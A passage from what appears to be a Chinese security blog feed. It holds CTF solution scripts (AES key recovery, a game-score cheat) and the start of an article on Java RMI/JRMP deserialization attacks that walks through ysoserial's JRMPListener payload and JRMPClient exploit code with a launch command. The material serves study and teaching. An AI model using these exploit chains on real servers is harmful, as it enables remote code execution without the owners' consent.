class=\"token punctuation\">,</span> <span class=\"token number\">265898280367</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5036645362649</span><span class=\"token punctuation\">,</span> <span class=\"token number\">342291058100503482469327892079792475478873</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>l <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>o <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>key_cand <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_key</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">for</span> r <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\"># 生成所有可能的因子组合序列</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">for</span> comb <span class=\"token keyword\">in</span> combinations<span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> comb<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token comment\"># 每个组合内所有因子乘积为一个大因子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                key <span class=\"token operator\">*=</span> num</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token comment\"># 除数大于余数</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">if</span> key <span class=\"token operator\">></span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                    <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> m <span class=\"token operator\">%</span> key<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                        key_cand<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>key <span class=\"token operator\">=</span> find_key<span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">for</span> key <span class=\"token keyword\">in</span> key_cand<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    key<span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        aes_dec <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        dec <span class=\"token operator\">=</span> aes_dec<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        dec <span class=\"token operator\">=</span> dec<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr></table></figure><p><strong>官方题解</strong>：通过遍历所有除数获得 key 的所有可能， <code>long_to_bytes(i,24)</code>  强制获得 24 位密钥，就不需要错误处理的环节了，最后 <code>if ... in ...</code>  找 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token number\">103560843006078708944833658339172896192389513625588</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m<span class=\"token operator\">=</span><span class=\"token number\">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>key<span class=\"token operator\">=</span>m<span class=\"token operator\">-</span>n</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#88007513702424243702066490746035974298749130602173983187260701596410698439661</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>enc<span class=\"token operator\">=</span><span class=\"token string\">b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W>F2\\x96cm\\xeb'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>iv<span class=\"token operator\">=</span><span class=\"token string\">b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> key<span class=\"token punctuation\">.</span>divisors<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    i<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    aes<span class=\"token operator\">=</span>AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    flag<span class=\"token operator\">=</span>aes<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'flag&#123;'</span> <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h1>\n<h2 id=\"checkin\"><a class=\"anchor\" href=\"#checkin\">#</a> checkin</h2>\n<p>提示：T-Rex Run!</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Runner</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">gameOver</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Runner<span class=\"token punctuation\">.</span>instance_<span class=\"token punctuation\">.</span>distanceRan <span class=\"token operator\">=</span> <span class=\"token number\">114514</span> <span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Runner<span class=\"token punctuation\">.</span>instance_<span class=\"token punctuation\">.</span>distanceMeter<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span><span class=\"token constant\">COEFFICIENT</span></pre></td></tr></table></figure><h1 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMyMDEwL2FydGljbGUvZGV0YWlscy8xMjE3MjU5ODk=\">二进制安全学习路线</span></p>\n<h2 id=\"ezhp_code\"><a class=\"anchor\" href=\"#ezhp_code\">#</a> ezhp_code</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMyMDEwL2FydGljbGUvZGV0YWlscy8xMjA0MDIxMDI=\">Heap overflow 堆溢出（一）</span></p>\n<p>An easy HeapOverflow</p>\n",
            "tags": [
                "CTF赛题",
                "CTF_WriteUp"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Java%E5%AE%89%E5%85%A8/",
            "url": "http://yoursite.com/Web/Java%E5%AE%89%E5%85%A8/",
            "title": "Java安全",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"rmi安全\"><a class=\"anchor\" href=\"#rmi安全\">#</a> RMI 安全</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXkvYXJ0aWNsZS9kZXRhaWxzLzEwNjk3MTYzMg==\">java 反序列化 ysoserial exploit/JRMPListener 原理剖析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXkvYXJ0aWNsZS9kZXRhaWxzLzEwNjk3MTUzMQ==\">java 反序列化 ysoserial exploit/JRMPClient 原理剖析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDY5Nzk4\">回顾攻击 Java RMI 方式</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQlVUTEVSL2FydGljbGVzLzE2NDc4NDA5Lmh0bWw=\">RMI 流程</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk3ODI5I2gzLTI=\">浅谈 Java RMI Registry 安全问题</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkzMD90aW1lX18xMzExPW40JTJCeG5EMEcwJTNEZVFxaUlQQUtEc0EzT2hEZ0JRRDlHUVA4RG9EJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJG\">针对 RMI 服务的九重攻击 上</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkzMj90aW1lX18xMzExPW40JTJCeG5EMEcwJTNEZVFxaUlwcTA1JTJCYkZZaXR0aSUzRHplR2tRNEQmYW1wO2FsaWNobGdyZWY9aHR0cHMlM0ElMkYlMkZ4ei5hbGl5dW4uY29tJTJGdSUyRjIwODUx\">针对 RMI 服务的九重攻击 下</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZXNjYXBlLXcvcC8xNjEwNzY3NS5odG1s\">从 ysoserial 讲 RMI/JRMP 反序列化漏洞 </span></p>\n<p><code>RMI</code> ：远程方法调用</p>\n<p><code>JRMP</code> ：Java 远程方法协议</p>\n<p><code>JNDI</code> ：Java 命名和目录接口</p>\n<p>RMI 攻击主要分 3 种目标： <code>RMI Client</code> 、 <code>RMI Server</code> 、 <code>RMI Registry</code> ，使用远程 Reference 字节码进行攻击</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240302102149544.png\" alt=\"image-20240302102149544\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240302214407353.png\" alt=\"image-20240302214407353\" /></p>\n<h2 id=\"攻击方式\"><a class=\"anchor\" href=\"#攻击方式\">#</a> 攻击方式</h2>\n<h3 id=\"rmiregistryexploit-bind\"><a class=\"anchor\" href=\"#rmiregistryexploit-bind\">#</a> RMIRegistryExploit bind</h3>\n<p><code>RMIRegistryExploit</code>  是客户端发起 RMI 通信并发送恶意 payload 到正常注册中心（服务端），注册中心反序列化并执行恶意命令。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">java</span> <span class=\"token parameter variable\">-jar</span> ysoserial.jar JRMPListener <span class=\"token number\">127.0</span>.0.1:8888 <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">-w</span> <span class=\"token number\">0</span></pre></td></tr></table></figure><p>Jep290 白名单策略，绕过：引入 <code>exploit.JRMPListener</code>  和 <code>payloads.JRMPClient</code></p>\n<h3 id=\"payloadsjrmplistener-exploitjrmpclient\"><a class=\"anchor\" href=\"#payloadsjrmplistener-exploitjrmpclient\">#</a> payloads.JRMPListener / exploit.JRMPClient</h3>\n<p>客户端打服务端</p>\n<p><strong> <code>payloads/JRMPLIstener</code> </strong></p>\n<ol>\n<li>发送 <code>payloads/JRMPLIstener</code>  到受害服务器，使服务器<strong>反序列化</strong>该 payload 后，会开启一个 <code>rmi</code>  服务并监听在设置的端口</li>\n<li>攻击者在自己的服务器使用 <code>exploit/JRMPClient</code>  与受害方进行通信，并且发送 <code>exp</code>  进行第二次反序列化（假如存在漏洞的服务器中有使用 <code>org.apacje.commons.collections</code>  包，则可以发送 <code>CommonsCollections</code>  系列的 payload），从而达到 RCE 的结果。</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">JRMPListener</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">PayloadRunner</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ObjectPayload</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">></span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UnicastRemoteObject</span> <span class=\"token function\">getObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> command<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 设置 jrmp 监听端口</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">int</span> jrmpPort <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 调用 RemoteObject 类的构造方法，new UnicastServerRef (jrmpPort) 作为构造方法的参数，然后返回一个 ActivationGroupImpl 类型的对象</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">UnicastRemoteObject</span> uro <span class=\"token operator\">=</span> <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">createWithConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ActivationGroupImpl</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">RemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token class-name\">RemoteRef</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">UnicastServerRef</span><span class=\"token punctuation\">(</span>jrmpPort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">// 通过反射设置 uro 对象中的 port 属性值为 jrmpPort</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">getField</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"port\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>uro<span class=\"token punctuation\">,</span> jrmpPort<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> uro<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过 <code>gadget链分析</code> ，知道生成的 payload 对象为 <code>ActivationGroupImpl</code>  类型，并将其向上转型为其父类 <code>UnicastRemoteObject</code>  类型，同时也测试此处 <code>rmi</code>  监听不能用 <code>RMIRegistryExploit</code>  攻击，该方法通过 bind 方法绑定恶意 payload 进行攻击，攻击无效</p>\n<p><strong>exploit/JRMPClient</strong>：通过 DGC 通信进行攻击</p>\n<p><code>main方法</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">void</span> main <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> args<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JRMPClient</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\" &lt;host> &lt;port> &lt;payload_type> &lt;payload_arg>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 生成指定的命令执行的 payload</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Object</span> payloadObject <span class=\"token operator\">=</span> <span class=\"token class-name\">Utils</span><span class=\"token punctuation\">.</span><span class=\"token function\">makePayloadObject</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">String</span> hostname <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> port <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"* Opening JRMP socket %s:%d\"</span><span class=\"token punctuation\">,</span> hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token comment\">// 通信方法</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token function\">makeDGCCall</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span> <span class=\"token class-name\">Exception</span> e <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Utils</span><span class=\"token punctuation\">.</span><span class=\"token function\">releasePayload</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>makeDGCCall通信方法</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> makeDGCCall <span class=\"token punctuation\">(</span> <span class=\"token class-name\">String</span> hostname<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> port<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> payloadObject <span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">UnknownHostException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">SocketException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">InetSocketAddress</span> isa <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InetSocketAddress</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Socket</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">DataOutputStream</span> dos <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token comment\">// 创建与使用 payloads/JRMPLIstener 开启监听的 rmi 服务的 Socket 通信</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            s <span class=\"token operator\">=</span> <span class=\"token class-name\">SocketFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">createSocket</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">setKeepAlive</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">setTcpNoDelay</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token comment\">// 获取 Socket 的输出流</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token class-name\">OutputStream</span> os <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token comment\">// 将输出流包装成 DataOutputStream 流对象</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            dos <span class=\"token operator\">=</span> <span class=\"token 